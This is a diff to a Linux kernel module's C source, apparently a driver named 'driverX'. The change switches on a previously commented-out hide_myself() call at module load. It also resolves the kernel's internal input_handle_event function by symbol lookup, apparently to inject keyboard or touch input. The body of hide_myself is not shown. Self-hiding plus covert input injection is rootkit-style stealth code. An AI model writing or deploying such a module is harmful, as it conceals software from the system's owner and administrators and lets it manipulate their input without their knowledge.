@@ -23,6 +23,11 @@
 #include <linux/slab.h>
 #include <linux/sysfs.h>
 
+#include <linux/input/mt.h>
+#include <linux/kprobes.h>
+#include <linux/version.h>
+#include <linux/input-event-codes.h>
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
@@ -37,6 +42,9 @@ module_param(mCommon, charp, 0644);
 MODULE_PARM_DESC(mCommon, "Parameter");
 
 static struct miscdevice dispatch_misc_device;
+
+static void (*my_input_handle_event)(struct input_dev *dev,
+							   unsigned int type, unsigned int code, int value) = NULL;
 
 static void __init hide_myself(void)
 {
@@ -266,8 +274,13 @@ static int __init hide_init(void)
 	    return ret;
 	}       
     }
-    
-    // hide_myself();
+
+	hide_myself();
+
+	if(my_input_handle_event == NULL) {
+		my_input_handle_event = (void (*)(struct input_dev *, unsigned int, unsigned int, int))kallsyms_lookup_name("input_handle_event"); // input_handle_event
+	}
+
     // printk("driverX: this: %p", THIS_MODULE); /* TODO: remove this line */
     return 0;
 }
